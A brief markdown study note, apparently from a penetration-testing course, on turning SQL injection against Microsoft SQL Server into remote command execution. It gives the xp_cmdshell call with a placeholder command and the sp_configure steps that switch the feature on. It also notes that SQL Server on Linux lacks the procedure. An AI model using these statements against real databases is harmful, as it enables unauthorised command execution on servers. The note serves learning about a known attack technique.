---
tags:
- sqlInjection
---

# SQL Injection. Remote Code Execution

## Run shell command in sql
### MS sql
```sql
EXECUTE xp_cmdshell 'command to run here';
```
Enable possibility to use xp_cmdshell
```sql

-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1;  
GO  
-- To update the currently configured value for advanced options.  
RECONFIGURE;  
GO  
-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1;  
GO  
-- To update the currently configured value for this feature.  
RECONFIGURE;  
GO
```

## Notes
the Linux version of SQL Server does not support  _xp_cmdshell_.

## References

1. web200.SQL Injection.Exploiting SQL Injection. Remote Code Execution